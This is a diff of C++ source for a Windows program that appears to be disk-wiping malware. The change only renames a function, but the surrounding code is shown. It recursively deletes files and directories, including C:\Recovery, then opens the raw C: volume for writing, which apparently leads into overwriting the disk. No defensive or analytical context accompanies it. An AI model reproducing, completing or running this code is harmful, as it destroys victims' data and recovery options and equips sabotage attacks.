@@ -36,7 +36,7 @@ void wipefiles(const std::wstring& path) {
     DeleteFileW(path.c_str());
 }
 
-void wipeDir(const std::wstring& dir) {
+void wipedirectory(const std::wstring& dir) {
     std::wstring search = dir + L"\\*";
     WIN32_FIND_DATAW fd;
     HANDLE hFind = FindFirstFileW(search.c_str(), &fd);
@@ -45,7 +45,7 @@ void wipeDir(const std::wstring& dir) {
         if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;
         std::wstring full = dir + L"\\" + fd.cFileName;
         if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-            wipeDir(full);
+            wipedirectory(full);
             SetFileAttributesW(full.c_str(), FILE_ATTRIBUTE_NORMAL);
             RemoveDirectoryW(full.c_str());
         }
@@ -73,7 +73,7 @@ int main() {
         L"C:\\Recovery"
     };
     for (const auto& t : targets) {
-        wipeDir(t);
+        wipedirectory(t);
     }
     HANDLE hVol = CreateFileW(L"\\\\.\\C:", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
     if (hVol != INVALID_HANDLE_VALUE) {
